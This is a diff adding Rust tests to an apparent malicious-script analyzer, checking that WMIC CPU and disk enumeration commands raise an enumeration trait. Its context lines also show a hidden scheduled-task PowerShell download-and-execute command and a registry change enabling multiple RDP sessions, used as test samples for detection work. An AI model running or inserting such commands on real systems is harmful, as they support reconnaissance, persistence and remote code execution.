@@ -2105,6 +2105,48 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn wmic_system_inventory_emits_enumeration_trait() {
+        let script = b"@echo off\r\n\
+            wmic cpu get caption, name, deviceid, numberofcores, maxclockspeed, status >> userdata.txt\r\n\
+            wmic logicaldisk get name,deviceid,filesystem,freespace,size >> disklog.txt\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "wmic-enum" && command.contains("wmic cpu get")
+            )),
+            "missing WMIC CPU enumeration: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "wmic-enum" && command.contains("wmic logicaldisk get")
+            )),
+            "missing WMIC logicaldisk enumeration: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn wmic_for_f_inventory_command_is_trimmed() {
+        let script = br#"for /f "tokens=3" %%a in ('wmic logicaldisk where "Size=250954240000" get Size | find "Size"') do echo %%a"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "wmic-enum"
+                        && command == "wmic logicaldisk where \"Size=250954240000\" get Size | find \"Size\""
+            )),
+            "WMIC for/f enumeration command was not trimmed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn rdp_session_relaxation_emits_remote_access_traits() {
         let script = b"@echo off\r\n\
             reg add \"HKLM\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"AllowMultipleTSSessions\" /t REG_DWORD /d 0x1 /f\r\n\
